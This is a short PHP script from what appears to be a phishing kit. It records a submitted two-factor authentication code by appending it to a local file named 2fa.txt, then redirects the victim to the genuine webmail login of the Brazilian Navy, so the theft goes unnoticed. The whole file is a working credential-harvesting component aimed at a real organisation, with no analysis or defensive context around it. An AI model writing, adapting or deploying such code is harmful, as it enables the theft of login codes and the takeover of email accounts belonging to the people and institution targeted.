<?php

file_put_contents("2fa.txt", "2FA_CODE: " . $_POST['totpcode'] . "\n", FILE_APPEND);
header('Location: https://webmail.marinha.mil.br/');
exit();
?>